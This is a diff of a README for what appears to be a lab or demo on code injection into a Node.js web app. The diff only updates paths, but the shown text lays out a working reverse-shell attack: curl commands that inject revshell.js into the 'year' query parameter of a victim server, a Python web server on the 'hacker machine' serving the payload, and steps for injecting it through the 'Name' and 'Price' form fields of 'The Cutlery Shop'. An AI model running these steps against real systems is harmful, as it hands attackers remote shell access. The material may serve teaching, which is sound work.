@@ -21,16 +21,16 @@ Open [revshell.js](./revshell.js) and modify it according to the IPv4 address of
 ### Method 1 - Copy Paste
 Copy the contents of the [revshell.js](./revshell.js) file.
 ```
-xclip -in payload/revshell.js -selection clipboard
+xclip -in payload/Linux/revshell.js -selection clipboard
 ```
 And paste the contents of [revshell.js](revshell.js) into the `year` HTTP GET Query
 ```
 curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
 ```
 ### Method 2 - Server/Client
-Host a server in the `payload` directory from the hacker machine
+Host a server in the `payload/Linux` directory from the hacker machine
 ```
-cd payload
+cd payload/Linux
 python -m http.server 5000
 ```
 Then use cURL to inject the payload to the victim web server
@@ -41,11 +41,11 @@ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/revshell.js)" h
 ## 1.4 Injecting payload into "The Cutlery Shop" web app
 Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [revshell.js](./revshell.js) there.
 
-![string-escape](../images/string-escape.png)
+![string-escape](../../images/string-escape.png)
 
 Alternatively, you can simply paste the payload into the `Price` field, since it does not take a string input.
 
-![direct-inject](../images/direct-inject.png)
+![direct-inject](../../images/direct-inject.png)
 
 ## 1.5 Result
 If successful, the hacker machine will receive a socket output similar to what is shown below:
